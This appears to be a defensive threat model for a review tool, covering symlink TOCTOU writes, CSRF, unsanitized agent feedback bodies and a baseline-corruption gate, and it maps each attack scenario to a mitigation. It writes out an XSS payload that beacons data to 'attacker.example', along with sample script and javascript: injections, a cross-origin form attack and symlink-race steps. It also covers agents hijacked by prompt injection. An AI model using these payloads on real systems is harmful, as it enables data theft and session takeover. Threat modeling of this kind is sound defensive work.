# Unit-03 Threat Model — Symlink TOCTOU + CSRF + Feedback Sanitization + Baseline-Corrupt Operator Gate

> **Scope.** This is the unit-scoped threat model for the four findings unit-03 closes: V-04 (symlink TOCTOU), V-08 (no CSRF), V-10 (unsanitized agent feedback bodies), V-11 (silent baseline re-establish). It is the analytical input the implementer/verifier hats consume when deciding which mitigation layers to land and which residual risks to push to unit-04 ASSESSMENTS.md.
>
> **Not in scope.** The intent-wide STRIDE matrix, dependency-by-dependency threat enumeration, and full feature-coverage map live in the synthesis artifact at `unit-04/THREAT-MODEL.md`. Cross-finding interactions (e.g. V-08-feeds-V-01) are noted here only when they shape unit-03's mitigation choices.

---

## 1. Trust boundaries this unit straddles

The four findings cross three distinct trust regions. Mitigation choices below are conditional on which boundary the finding sits on.

### 1.1 Local mode — loopback-only, fully trusted

`isRemoteReviewEnabled() === false`. The HTTP server binds 127.0.0.1 only; reaching the bound port already implies localhost code execution. `requireTunnelAuth` and `verifyFeedbackMutationAuth` short-circuit to `true`. Every "human-side" surface in this mode is a localhost user, a localhost shell, or another process running in the same uid — all peers of the agent.

**Implication for V-04:** The symlink-TOCTOU attacker for the `haiku_human_write` MCP-tool path is a co-resident local process or a hostile agent in the same uid that can race the agent. This is the lower-likelihood half of V-04 (real but requires existing local breach). The SPA `upload-routes.ts:413-454` mirror of the same vuln is unreachable in local mode (loopback gate).

**Implication for V-08:** CSRF is undefined in local mode — no cross-origin attacker can reach loopback from the browser without local code execution.

**Implication for V-10:** Agent-authored feedback bodies in local mode still flow into the SPA renderer (which the local user opens at `http://127.0.0.1:<port>`). The XSS payload runs in the loopback origin's context, which is shared with the entire `127.0.0.1` browser cookie jar. Severity is reduced from "remote attacker pivots into reviewer session" to "compromised agent pivots into the local user's loopback browser context", but it is non-zero.

**Implication for V-11:** Operator confirmation requirement is the same in both modes — the agent never gets to silently establish.

### 1.2 Tunnel mode — JWT-bound, attacker-reachable

`isRemoteReviewEnabled() === true`. Server is reachable over the public localtunnel URL. Every request must carry an HS256 JWT signed with the per-process `EPHEMERAL_SECRET`, with `tun` claim bound to the active tunnel URL and `sid` claim bound to the issuing session. **All four findings escalate** in this mode:

- **V-04 SPA mirror** becomes reachable to any holder of a valid intent-bound JWT.
- **V-08 CSRF** is a live attack against any reviewer whose JWT has been shared in a chat link, screenshot, or accidental commit.
- **V-10 feedback XSS** lets an agent (or anyone who can reach the `haiku_classify_drift.feedback_creates[]` path) plant payloads that execute in the reviewer's tunnel-origin context — the same context that holds the JWT for the SPA's other mutating endpoints.
- **V-11 baseline corruption** is a primitive an attacker uses to manufacture a "repair me" prompt that an over-trusting operator or auto-tooling rubber-stamps, swapping the baseline silently.

### 1.3 Audit-trail integrity boundary

Independent of network mode, every finding here either consumes or produces audit-log entries (`write-audit.jsonl`, `action-log.jsonl`, `baseline.json`, drift-assessment records). V-11 is *the* threat to audit-trail integrity; V-10 (sanitization) and V-08 (CSRF-replay) write into it. Mitigation must keep the trail trustworthy as a forensic surface — that is the load-bearing input every other defense-in-depth control depends on.

### 1.4 Boundary-weakening assumptions (consequence rule)

Severity calls below assume:
- Tunnel JWTs are not trivially leaked. If chat-link sharing of `?t=<jwt>` URLs is the norm (and V-08's recommended fix #1 explicitly anticipates this), the V-08 severity ratchets to High.
- Agent is trusted-but-honest, not actively hostile. If the agent is treated as adversarial (hostile-agent threat model), V-10 ratchets to Medium and `haiku_human_write`'s self-reported `human_author_id` (V-03, out of scope here) becomes a Critical poisoning primitive.
- `EPHEMERAL_SECRET` rotates on process restart and never leaves memory. If it's ever persisted to disk (e.g. for warm-restart), every JWT-bound severity ratchets up.

These assumptions are the unit-04 THREAT-MODEL.md's job to explicitly land. This unit ships mitigations that hold under the stated assumptions and surface residual risk where they don't.

---

## 2. STRIDE classification per finding

| Finding | STRIDE primary | STRIDE secondary | Trust boundary | Severity (assumed) | Severity (worst-case assumption-break) |
|---|---|---|---|---|---|
| V-04 — symlink TOCTOU on `haiku_human_write` + SPA mirror | **T**ampering (write outside intent dir) | **E**levation of Privilege (filesystem write to operator-only paths e.g. `/etc/cron.d`) | Local mode (MCP path), Tunnel mode (SPA mirror) | Medium | High (if attacker can pre-position symlinks via concurrent MCP session) |
| V-08 — no CSRF on POST/PUT/DELETE | **S**poofing (forge reviewer identity via cross-origin form), **T**ampering (write attacker payload into intent), **E**levation of Privilege (chained with V-01/V-02 → stored XSS in tunnel origin) | **I**nformation Disclosure (CSRF-as-confused-deputy → exfiltrate intent contents) | Tunnel mode | Medium | High (if `?t=` JWT URLs leak via Slack/screenshots — common per V-08's own description) |
| V-10 — unsanitized `feedback_creates[].body` | **T**ampering (planted markup in the audit-visible feedback record), **E**levation of Privilege (XSS in reviewer SPA chains to JWT exfil) | **R**epudiation (forged FB body attributable to wrong author) | All modes (local: pivots through loopback browser; tunnel: pivots into reviewer session) | Low | Medium (if SPA renderer regression exposes raw HTML — which is the *reason* for server-side defense-in-depth) |
| V-11 — silent baseline auto-establish on corruption | **T**ampering (baseline replaced with attacker-chosen content), **R**epudiation (post-replacement, no record of pre-corruption state), **D**enial of Service (force baseline-thrash to disable drift detection) | **I**nformation Disclosure (baseline-thrash telemetry reveals attack pattern) | All modes (corrupt-baseline primitive is a write surface; the silent-establish is the gate-side weakness) | Low | High (if combined with V-04 — attacker writes corrupt baseline, then triggers next-tick auto-establish, fully laundering attacker-chosen content into the trusted baseline with zero operator visibility) |

### 2.1 STRIDE coverage notes

- **R**epudiation appears as secondary on V-10 and V-11 because both findings undermine the durable, attributable record this intent is built around. The unit-04 ASSESSMENTS.md gate-evidence column directly depends on the audit log being non-repudiable.
- **D**enial of Service appears only on V-11 (baseline-thrash). V-04's filesystem-exhaustion variant (planted symlink to `/dev/full`) is technically a DoS vector but is not the primary finding; it is captured under V-07 in the broader vuln report.
- **I**nformation Disclosure appears as worst-case on V-08 and V-11 because both can be chained — V-08 via CSRF-confused-deputy to read intent contents through the agent's session; V-11 via the baseline-thrash telemetry channel.

---

## 3. Per-finding attack scenarios (the inputs the implementer hat needs)

The implementer hat lands code; these scenarios are the test vectors the verifier hat will look for. Each scenario calls out (a) precondition, (b) attacker action, (c) impact, (d) the specific mitigation layer that defeats it, (e) the residual risk that survives the mitigation.

### 3.1 V-04 — Symlink TOCTOU (multi-tick race)

**Scenario A — Single-shot symlink swap on existing parent (already mitigated upstream).**
- Precondition: parent dir exists; pre-validation `realpathSync.startsWith(intentRoot)` passes.
- Attacker action: between `realpathSync` check and `mkdirSync`+`rename`, swap parent dir to a symlink pointing outside intent.
- Impact: file lands in attacker-chosen path.
- Defeating layer: `safeMkdirAndRename(intentRoot, parent, tmpPath, destPath)` — `O_DIRECTORY | O_NOFOLLOW` parent open, `openat`-style rename via the parent fd. Concurrent symlink swap fails the rename because the kernel inode the fd holds is the original directory, not the swapped symlink.
- Residual: zero, IF Node's `fs.openSync` honors `O_NOFOLLOW` on the target Node version. Document in unit-04 ASSESSMENTS.md the minimum Node version the helper supports.

**Scenario B — Newly-created intermediate dir race (the V-04 flagship).**
- Precondition: parent dir does NOT exist; current code skips the `realpathSync` check entirely (haiku_human_write.ts:222 — "if the PARENT directory exists, resolve it and check").
- Attacker action: agent calls `haiku_human_write` for `stages/security/knowledge/note.md`; in a tight loop attacker `mkdir -p stages/security && ln -s /tmp/owned stages/security/knowledge`; `mkdirSync(parentDir, { recursive: true })` follows the planted symlink because `recursive: true` traverses existing symlinks; subsequent `rename(tmpPath, destAbs)` lands the file under `/tmp/owned/note.md`.
- Impact: arbitrary filesystem write outside intent dir.
- Defeating layer: same `safeMkdirAndRename` helper, but called UNCONDITIONALLY (not conditioned on parent-existence). The helper walks the chain from `intentRoot` segment-by-segment, opening each with `O_DIRECTORY | O_NOFOLLOW`, and creates missing segments via `mkdirat(parentFd, segment)` — refusing to traverse any pre-existing symlink in the chain.
- Residual: if the kernel does not support `O_NOFOLLOW` semantics on the target Node runtime, the fallback is single-shot `realpathSync(parentDir).startsWith(realpathSync(intentDir))` AFTER mkdir AND immediately before rename. This is not race-free; it closes single-shot easy cases. Document in unit-04 ASSESSMENTS.md as residual risk against an attacker who can keep flipping symlinks faster than the rename window.

**Scenario C — SPA upload mirror (`upload-routes.ts:413-454`).**
- Precondition: tunnel mode, valid intent-bound JWT.
- Attacker action: same as Scenario A/B but invoked through the SPA upload endpoint, which uses an inline copy of the same TOCTOU-prone pattern.
- Impact: same — filesystem write outside intent dir, but reachable to any JWT holder (much wider blast radius than the local-mode-only MCP-tool path).
- Defeating layer: SPA upload route MUST call the same `safeMkdirAndRename` helper. Code-shared; not a parallel re-implementation.
- Residual: same as Scenario B.

**Test vectors the verifier looks for:**
1. Planted symlink at parent dir → write rejected with structured error (e.g. `parent_chain_contains_symlink`).
2. Planted symlink at grandparent dir → write rejected.
3. Concurrent symlink-swap test: two threads, one calls helper, the other in a loop replaces an intermediate dir with a symlink. After 1000 iterations, zero writes land outside intent dir.
4. Both call sites (`state-tools.ts` haiku_human_write AND `upload-routes.ts:413-454`) hit by the same test fixture.

### 3.2 V-08 — CSRF (three layers, not one)

**Scenario A — Cross-origin form post with leaked `?t=` URL.**
- Precondition: tunnel mode; reviewer has shared `https://<tunnel>?t=<jwt>` in a chat / screenshot / commit.
- Attacker action: hosts an HTML page with `<form action="https://<tunnel>/api/intents/<slug>/uploads/knowledge?t=<jwt>" method="POST" enctype="multipart/form-data">` containing the V-01 XSS payload; reviewer (or any victim) visits the attacker page; browser auto-submits cross-origin (multipart/form-data is on the CORS-safe-trio allowlist; no preflight).
- Impact: arbitrary upload lands in the reviewer's intent; chained with V-01/V-02 → stored XSS executes in tunnel origin → JWT exfil → full session takeover.
- Defeating layer 1 (HARD): **reject `?t=<jwt>` on POST/PUT/DELETE/PATCH** in `requireTunnelAuth` / `auth.ts`. Mutating routes MUST use `Authorization: Bearer`. Cross-origin attackers cannot set Authorization headers without a preflight, which they cannot satisfy. This is the strongest single layer.
- Defeating layer 2 (defense in depth): **Origin allowlist** via `HAIKU_ALLOWED_ORIGINS` (default `http://localhost:*`). Mutating requests with missing or non-allowed `Origin` rejected with 403. Belt-and-suspenders for layer 1.
- Defeating layer 3 (defense in depth): **Per-session CSRF nonce** baked into SPA bootstrap, required as `X-Haiku-CSRF` header on mutations. Custom header forces preflight. Catches the class of bugs where layers 1 and 2 are accidentally bypassed for a future endpoint that forgets to register them.
- Residual: if all three layers are bypassed (e.g. by a future endpoint that registers `preHandler: false`), `scripts/audit-mutating-routes.mjs` is the static-analysis safety net — fails CI on any `app.post|put|patch|delete` registration not covered by the global preHandler.

**Scenario B — Same-origin XSS chains into mutation.**
- Precondition: tunnel mode; an XSS exists somewhere in the SPA (V-01, V-02, V-10).
- Attacker action: XSS payload runs in tunnel origin; reads JWT from `localStorage` / cookies / current-page URL; calls mutating endpoint same-origin.
- Impact: full session takeover.
- Defeating layer: NONE of the three CSRF layers help here — same-origin requests pass Origin checks, send the CSRF nonce, and use the Authorization header. **CSRF is not the right control for same-origin XSS.** The right controls are V-01/V-02 (input-side allowlists) and V-10 (sanitization). Document in unit-04 ASSESSMENTS.md as residual risk: CSRF defenses are scoped to cross-origin attacks; same-origin XSS protection is a separate control plane.

**Test vectors the verifier looks for:**
1. POST with `?t=<jwt>` query param + no Authorization header → 401 `query_param_token_disallowed_on_mutating_route`. Same request as GET → 200.
2. POST with valid Authorization but Origin: `https://evil.example` → 403 `origin_not_allowed`.
3. POST with valid Authorization, allowed Origin, but missing `X-Haiku-CSRF` → 403 `csrf_nonce_missing`.
4. POST with valid Authorization, allowed Origin, valid `X-Haiku-CSRF` → 200.
5. `scripts/audit-mutating-routes.mjs` enumerates every `app.post|put|patch|delete` registration and asserts the global preHandler is in scope; CI fails on any orphan route.

### 3.3 V-10 — Unsanitized agent feedback body

**Scenario A — Direct agent write of `<script>` payload.**
- Precondition: agent compromised or behaving badly.
- Attacker action: agent calls `haiku_classify_drift` with `feedback_creates: [{ body: "<script>fetch('/api/feedback-intent/<slug>', {credentials:'include'}).then(r => r.json()).then(d => navigator.sendBeacon('https://attacker.example', JSON.stringify(d)))</script>" }]`; body lands in `FB-NN.md` raw.
- Impact: when reviewer SPA renders the feedback markdown, payload executes in tunnel-origin context (tunnel mode) or loopback context (local mode); chained with V-08 layer-3 nonce → exfils nonce → mutation primitive.
- Defeating layer: server-side sanitization in `feedback-api.ts` write path. Strip `<script>`, `<iframe>`, `<object>`, `<embed>`, `<style>`, and dangerous attributes (`on*=`, `formaction=`, `srcdoc=`, anything starting with `javascript:` / `data:text/html` / `vbscript:`). Mirror the SPA's input-side rendering rules so server and client agree on the safe markdown subset.
- Residual: any future markdown extension the SPA renderer supports (e.g. raw-HTML passthrough) that the server-side sanitizer doesn't know about. Mitigation: place sanitizer in a single chokepoint (NOT in N call sites) and document the contract: "every external-input body field flows through this function before disk write."

**Scenario B — Markdown-rendered link to `javascript:`.**
- Precondition: same.
- Attacker action: `body: "[click](javascript:alert(document.cookie))"`.
- Impact: rendered as a clickable anchor with `href="javascript:..."`.
- Defeating layer: sanitizer MUST reject URL schemes other than `http:`, `https:`, `mailto:`, and intent-relative paths.
- Residual: if a future markdown renderer adds support for additional schemes, the sanitizer must be updated in lockstep. Document in unit-04 ASSESSMENTS.md.

**Test vectors the verifier looks for:**
1. POST with `body: "<script>alert(1)</script>"` → stored body has `<script>` removed (or escaped) before disk write.
2. POST with `body: "[x](javascript:alert(1))"` → stored body has `javascript:` URL stripped or replaced with `#`.
3. POST with `body: "**bold** _italic_ [link](https://example.com)"` → stored body preserves all three (positive case: sanitization is not over-broad).
4. POST with `body: "<img src=x onerror=alert(1)>"` → stored body has `onerror` stripped.

### 3.4 V-11 — Operator-only ack with reconstructed-baseline diff

**Scenario A — Attacker corrupts baseline → next tick silent-establishes attacker content.**
- Precondition: attacker has any write surface to `.haiku/intents/<slug>/stages/<stage>/baseline.json` (V-04 chain, hostile co-resident process, stuck CI runner).
- Attacker action: truncate or scramble baseline.json; wait for next agent tick; gate observes `baseline_corrupt`; current code returns the error and the agent's natural next action (`haiku_repair`) re-establishes the baseline from whatever is on disk; attacker has pre-positioned `evil.config` in the tracked surface; baseline now records `evil.config` as the trusted snapshot.
- Impact: full audit-trail laundering. Future drift detection treats `evil.config` as the established baseline; no operator notification; no diff against pre-corruption state.
- Defeating layer 1: **gate refuses to silent-establish on `baseline_corrupt`.** Returns a hard error that no agent action can satisfy.
- Defeating layer 2: **`reconstructPriorBaseline(intentDir, stage)` rebuilds the last-known-good baseline** from `baseline-content/` (the durable per-file content snapshots) plus `action-log.jsonl` (the chronological event stream). The reconstructed baseline is the one the operator-confirmation diff is computed against.
- Defeating layer 3: **operator-only path** — `/haiku:repair --confirm-baseline-reset --diff-shown` presents the reconstructed-vs-on-disk diff, requires operator to confirm a specific diff hash. Agent CANNOT set `baseline_corrupt_acknowledged` directly (no MCP-tool exposure for the field).
- Defeating layer 4: **rate-limit / circuit-breaker** — more than 3 baseline corruptions in 10 ticks emits `haiku.security.baseline_thrash` telemetry AND disables auto-recovery (forces manual intervention). Defeats the "spam corruptions to wear down operator vigilance" attack.
- Residual: if `baseline-content/` itself is the write surface the attacker controls, reconstruction returns attacker-chosen content. Mitigation: `baseline-content/` writes are integrity-stamped (sha256 in baseline.json's per-file entry) and reconstruction validates each file's sha256 before accepting it as the prior-baseline. Document in unit-04 ASSESSMENTS.md as residual risk: if both `baseline.json` AND `baseline-content/` are corrupted in the same window, reconstruction returns "no prior baseline available" and operator must establish from scratch with full directory diff against `git log`.

**Scenario B — Operator confirmation fatigue.**
- Precondition: operator sees baseline-corruption prompts often (legitimate or malicious).
- Attacker action: spam low-rate corruptions just under the rate-limit threshold to train operator to rubber-stamp the prompt.
- Impact: operator clicks through the diff without reading.
- Defeating layer: rate-limit is the structural defense; require operator to type the diff hash (not just click), so muscle-memory rubber-stamping is impossible. Document residual: operator can still copy-paste hash without reading the diff. Out of scope for unit-03; flag in unit-04 ASSESSMENTS.md.

**Test vectors the verifier looks for:**
1. Corrupt `baseline.json` → next tick returns `baseline_corrupt` error; no `baseline_corrupt_acknowledged` field appears anywhere agent-writable.
2. Operator runs `/haiku:repair --confirm-baseline-reset --diff-shown` → command computes reconstructed baseline, displays diff, requires `--confirm-diff-hash <sha256>` argument matching the displayed diff hash.
3. Agent attempts to call any MCP tool to set `baseline_corrupt_acknowledged` → no such tool exists; if attempted via direct frontmatter write, `guard-workflow-fields` PreToolUse hook blocks (and is the compensating control documented in unit-04 ASSESSMENTS.md).
4. Trigger 4 baseline corruptions within 10 ticks → 4th emits `haiku.security.baseline_thrash` telemetry; subsequent `/haiku:repair` invocations refuse auto-recovery and require explicit `--override-thrash-circuit-breaker` flag.

---

## 4. Cross-finding interactions (chains the implementer must keep in mind)

| Chain | Path | Why it matters for unit-03 |
|---|---|---|
| V-08 → V-01 / V-02 | CSRF lands attacker payload → stored XSS executes in tunnel origin | V-08 mitigation alone doesn't close V-01/V-02 (those are unit-01's job), but V-08 mitigation is the upstream gate that determines whether V-01/V-02 are externally exploitable or only insider-exploitable. |
| V-04 → V-11 | Symlink TOCTOU writes attacker `baseline.json` → next-tick silent-establish launders content | V-04's helper MUST be used by every write path that could touch baseline files. V-11's reconstruction defense MUST validate `baseline-content/` integrity. The two mitigations only chain-defeat this attack if both land. |
| V-10 → V-08 layer 3 | Stored XSS in feedback body reads `X-Haiku-CSRF` from SPA bootstrap → CSRF nonce no longer protects against same-origin requests | This is a same-origin attack; CSRF nonces are by design not a defense against it. The defense is V-10 (sanitization) plus V-01/V-02 (renderer hardening). Document the boundary in unit-04 ASSESSMENTS.md so reviewers don't mistake CSRF defense for XSS defense. |
| V-11 thrash → V-04 | Repeated baseline-corruption attempts use `haiku_human_write` against `baseline.json`; the V-04 helper is the write-path validator | Once the V-04 fix lands and `safeMkdirAndRename` is called from `state-tools.ts haiku_human_write`, the corruption surface narrows to "attacker has direct filesystem access to the intent dir" — at which point the rate-limit + telemetry layer of V-11 becomes the primary detection control. |

---

## 5. Assets, threat actors, attack surface (asset inventory)

### 5.1 Assets (what attackers want)

| Asset | Located at | Confidentiality | Integrity | Availability |
|---|---|---|---|---|
| Intent contents (specs, knowledge, units) | `.haiku/intents/<slug>/` | Medium (may contain PII or proprietary plans) | **High** (the entire intent is integrity-critical; tampering corrupts every downstream stage) | Medium |
| Audit trail (`write-audit.jsonl`, `action-log.jsonl`) | per-intent | Medium | **Critical** (the forensic chain of custody for everything that happened) | Medium |
| Baseline (`baseline.json`, `baseline-content/`) | per-intent per-stage | Low | **Critical** (the trust anchor for drift detection) | Medium |
| Tunnel JWT signing key (`EPHEMERAL_SECRET`) | in-process memory | **Critical** (key disclosure → forge any session) | Critical | Medium |
| Reviewer session JWTs | in-flight + browser localStorage | **High** (token capture → impersonate reviewer) | High | Low |
| Operating-system files outside intent dir (`/etc/cron.d`, `~/.ssh/authorized_keys`) | / | High | **Critical** (V-04 escape primitive lands here) | High |

### 5.2 Threat actors (who attacks)

| Actor | Mode | Capability | Findings they touch |
|---|---|---|---|
| Co-resident hostile process (same uid, same host) | Local + Tunnel | Can race the agent's filesystem operations, can corrupt baseline.json directly | V-04 (Scenario A/B), V-11 (Scenario A) |
| Phisher with leaked `?t=<jwt>` URL | Tunnel only | Can mint cross-origin POSTs against the tunnel URL with the captured token | V-08 (Scenario A), then chains to V-01/V-02/V-10 |
| Hostile-but-bounded agent (compromised by prompt injection upstream) | Local + Tunnel | Can call any MCP tool the agent can call; subject to PreToolUse hook restrictions; bounded by `guard-workflow-fields` denials | V-10 (Scenario A), V-04 (via concurrent calls), V-11 (via baseline-corruption attempts) |
| Insider reviewer (legitimate JWT but malicious intent) | Tunnel | Full reviewer privileges; can upload anything the SPA accepts | All four (highest blast radius for V-04 SPA mirror, V-08 layer-1 bypass via valid Authorization header, V-10 if reviewer becomes feedback author) |
| External CDN compromise of tunnel-domain HTML | Tunnel | Same as same-origin XSS — chains past CSRF defenses | V-08 same-origin escape (residual) |

### 5.3 Attack surface

| Surface | Code | Findings |
|---|---|---|
| `haiku_human_write` MCP tool | `state-tools.ts` (haiku_human_write helper) | V-04 |
| SPA upload routes | `http/upload-routes.ts:413-454` (mkdir+rename), `:227-498` (stage-output POST), `:502-733` (knowledge POST) | V-04 (mirror), V-08 |
| Tunnel auth surface | `http/auth.ts:17-28, 34-51` | V-08 layer 1 |
| Feedback write path | `http/feedback-api.ts` (writeFeedbackFile callsite from `haiku_classify_drift`) | V-10 |
| Drift-detection gate | `orchestrator/workflow/drift-detection-gate.ts:431-533` | V-11 |
| Baseline reconstruction (new) | `orchestrator/workflow/drift-baseline.ts` (new export `reconstructPriorBaseline`) | V-11 |
| Operator repair command (new flags) | `/haiku:repair` | V-11 |

---

## 6. Mitigation contract — what unit-03's implementer hat MUST land

| ID | Mitigation | Code location | Test vector reference |
|---|---|---|---|
| M-04.1 | `safeMkdirAndRename(intentRoot, parent, tmpPath, destPath)` exported from `path-safety.ts`; uses `O_DIRECTORY \| O_NOFOLLOW`; segment-by-segment chain walk with `mkdirat` for missing segments; atomic `renameat`. | `packages/haiku/src/http/path-safety.ts` | §3.1 vectors 1–3 |
| M-04.2 | Both `haiku_human_write` (state-tools.ts) AND `upload-routes.ts:413-454` import and use `safeMkdirAndRename` — code-shared, not parallel re-implementations. | `state-tools.ts`, `http/upload-routes.ts` | §3.1 vector 4 |
| M-04.3 | If `O_NOFOLLOW` unavailable on target Node runtime, fall back to single-shot `realpathSync` post-mkdir + immediately pre-rename, AND document residual race-window in unit-04 ASSESSMENTS.md as `stage_revisit` FB. | same | (skip-mark in test if fallback engaged) |
| M-08.1 | `requireTunnelAuth` rejects `?t=<jwt>` on POST/PUT/PATCH/DELETE; returns 401 with structured `query_param_token_disallowed_on_mutating_route`. | `http/auth.ts` | §3.2 vector 1 |
| M-08.2 | `HAIKU_ALLOWED_ORIGINS` env-var allowlist (default `http://localhost:*`); reject mutating requests with missing/non-allowed Origin; 403 `origin_not_allowed`. | `http/auth.ts` (or new `http/csrf.ts`) | §3.2 vector 2 |
| M-08.3 | Per-session CSRF nonce baked into SPA bootstrap; required as `X-Haiku-CSRF` header on mutations; 403 `csrf_nonce_missing` / `csrf_nonce_invalid`. | `http/csrf.ts` (new), SPA bootstrap | §3.2 vectors 3–4 |
| M-08.4 | All three layers registered as a single Fastify global `preHandler` for tunnel mode (NOT per-route). | `http/server.ts` (or wherever Fastify is wired) | §3.2 vector 5 |
| M-08.5 | `scripts/audit-mutating-routes.mjs` enumerates every `app.post\|put\|patch\|delete` and asserts the global preHandler covers it; runs in CI. | `scripts/audit-mutating-routes.mjs` (new) | §3.2 vector 5 |
| M-10.1 | Server-side body sanitizer in `feedback-api.ts` write path: strips `<script>`, `<iframe>`, `<object>`, `<embed>`, `<style>`, dangerous attributes (`on*=`, `formaction=`, `srcdoc=`), URL schemes other than `http:`/`https:`/`mailto:`. Single chokepoint, called from every external-input body write. | `http/feedback-api.ts` (and shared helper) | §3.3 vectors 1–4 |
| M-11.1 | `baseline_corrupt` outcome MUST NOT silent-establish on next tick. Gate returns hard error; agent has no MCP-tool path to `baseline_corrupt_acknowledged`. | `orchestrator/workflow/drift-detection-gate.ts` | §3.4 vector 1, 3 |
| M-11.2 | `reconstructPriorBaseline(intentDir, stage)` exported from `drift-baseline.ts`; rebuilds last-known-good baseline from `baseline-content/` (sha256-validated) + `action-log.jsonl`. | `orchestrator/workflow/drift-baseline.ts` | §3.4 vector 2 |
| M-11.3 | `/haiku:repair --confirm-baseline-reset --diff-shown --confirm-diff-hash <sha256>` operator command. Refuses to run without all four flags. Computes diff between reconstructed and on-disk; requires hash match. | `/haiku:repair` skill / handler | §3.4 vector 2 |
| M-11.4 | Rate-limit: > 3 baseline corruptions in 10 ticks emits `haiku.security.baseline_thrash` telemetry AND disables auto-recovery (requires `--override-thrash-circuit-breaker` operator flag). | `orchestrator/workflow/drift-detection-gate.ts` (counter + telemetry) | §3.4 vector 4 |

---

## 7. Residual risks (deferred to unit-04 ASSESSMENTS.md)

These are intentionally out of scope for unit-03 and MUST be filed as `stage_revisit` FBs by the unit-04 author hat. They are listed here so the verifier hat does not flag them as missing mitigations on unit-03.

1. **`O_NOFOLLOW` fallback race window** — if M-04.3 fallback engages, single-shot `realpathSync` post-mkdir is not race-free against an attacker who flips symlinks faster than the rename window. Unit-04 should file `O_NOFOLLOW`-everywhere migration as follow-up.
2. **CSRF defenses do not protect against same-origin XSS** — V-10 sanitization is the primary control. Unit-04 ASSESSMENTS.md should explicitly document the boundary so reviewers don't mistake one for the other.
3. **Markdown sanitizer drift vs SPA renderer** — server sanitizer must be updated in lockstep with any SPA renderer feature add. Unit-04 should file a recurring audit task.
4. **Operator confirmation fatigue on V-11 prompts** — typing the diff hash mitigates but doesn't eliminate; copy-paste-without-reading is still possible.
5. **Both `baseline.json` AND `baseline-content/` corrupted simultaneously** — reconstruction returns "no prior baseline" and operator establishes from scratch via git log. Unit-04 ASSESSMENTS.md should document the recovery runbook.
6. **Rate limiting on the SPA upload + MCP surfaces in general** — already noted in unit-03 spec as deferred to a follow-up `unit-05-rate-limiting`.

---

## 8. Anti-patterns this threat model deliberately avoids

The threat-modeler hat's RFC-2119 anti-patterns translate to concrete things THIS document does NOT do:

- **NOT modeling external threats only.** Co-resident hostile process, hostile-but-bounded agent, and insider reviewer all appear in §5.2 actor table.
- **EXPLICITLY mapping trust boundaries.** §1 does this for local mode, tunnel mode, and audit-trail integrity, with consequence rules in §1.4.
- **NOT a checklist.** The STRIDE table in §2 names primary AND secondary impacts and explains the chain rather than ticking each letter.
- **NOT ignoring internal data flows.** §4 cross-finding chains and §5.3 attack-surface-to-code mapping cover the internal-service edges.
- **NOT rating everything Medium.** §2 ratings explicitly differ across findings AND across assumption regimes (worst-case column).
